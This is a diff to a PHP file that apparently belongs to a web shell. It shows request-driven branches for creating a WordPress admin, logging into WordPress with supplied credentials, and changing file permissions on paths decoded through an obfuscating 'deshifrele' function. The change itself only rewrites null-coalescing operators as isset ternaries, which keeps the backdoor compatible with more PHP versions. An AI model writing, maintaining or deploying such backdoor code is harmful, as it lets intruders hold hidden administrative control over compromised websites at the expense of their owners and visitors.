@@ -423,8 +423,8 @@ else if ($ne == 'create_wp_admin') {
 	}
 }
 else if ($ne == 'login_wp') {
-	$username = $_GET['wp_username'] ?? $_POST['wp_username'];
-	$password = $_GET['wp_password'] ?? $_POST['wp_password'];
+	$username = isset($_GET['wp_username']) ? $_GET['wp_username'] : $_POST['wp_username'];
+	$password = isset($_GET['wp_password']) ? $_GET['wp_password'] : $_POST['wp_password'];
 
 	try {
 		if (isset($_SESSION['gr_wp_load']) && file_exists($_SESSION['gr_wp_load'])) {
@@ -449,7 +449,7 @@ else if ($ne == 'login_wp') {
 	}
 }
 else if ($ne == 'chmod') {
-	$mod = $_POST['mod'] ?? $_GET['mod'];
+	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
 	$rootPath = realpath(deshifrele(urldecode($_POST['fayl'])));
 	if ($mod && $rootPath) {
 		$status = chmod($rootPath, octdec($mod));
